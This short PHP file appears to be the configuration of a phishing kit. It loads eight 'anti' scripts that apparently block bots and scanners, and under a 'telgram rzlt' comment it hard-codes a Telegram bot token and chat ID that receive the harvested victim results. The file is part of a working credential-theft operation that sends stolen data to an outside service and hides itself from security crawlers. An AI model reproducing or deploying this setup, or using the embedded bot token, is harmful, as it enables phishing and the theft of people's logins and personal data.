<?php

include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';

$email =""; 

//telgram rzlt
$api = "5588565701:AAHIsSf6vuXGQSmNVQTaPi4p15AF0Bf2B9M";
$chatid = "5251661997";

?>